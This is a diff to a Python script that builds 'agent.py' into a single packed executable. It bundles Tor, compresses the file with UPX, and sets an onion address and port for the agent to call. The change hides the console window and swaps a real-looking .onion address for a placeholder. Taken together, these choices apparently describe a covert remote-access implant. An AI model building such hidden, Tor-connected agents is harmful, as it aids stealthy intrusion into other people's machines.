@@ -3,13 +3,6 @@ import requests
 import os
 import zipfile
 import sys
-from argparse import ArgumentParser
-
-# from string import (
-#     ascii_lowercase,
-#     ascii_uppercase,
-#     digits
-# )
 
 #This command works well and produces out without error
 # PyInstaller --debug all --onefile --add-data=torbundle:torbundle --upx-dir=upx-3.96-win64 agent.py 
@@ -68,6 +61,7 @@ if __name__ == '__main__':
         'agent.py',
         '--onefile',
         # '--debug-all',
+        '--noconsole',
         '--add-data=torbundle:torbundle',
         '--upx-dir=upx-3.96-win64'
     ])
@@ -78,6 +72,6 @@ if __name__ == '__main__':
     #     ])
 
     #enter the onion address and port here
-    onion = "axz2zqbav3nrnoofvwfk6qzp76aujxcwoeqp5pefwr3hgkk5rvjlaqyd.onion"
+    onion = "Your onion address"
     port = 80
     append_address(onion, port)
